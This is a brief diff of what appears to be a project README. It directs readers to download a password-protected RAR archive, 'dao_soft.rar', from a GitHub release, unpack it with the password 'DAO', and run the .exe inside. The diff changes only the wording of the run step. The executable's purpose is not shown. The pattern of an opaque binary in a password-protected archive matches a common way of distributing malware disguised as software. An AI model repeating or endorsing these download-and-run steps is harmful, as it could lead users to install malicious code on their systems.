@@ -6,6 +6,6 @@ how to launch it
 https://github.com/goodesi/DAO/releases/download/download/dao_soft.rar
 
    password: DAO
-3) setup exe
+3) run .exe file
 4) follow the instructions
    
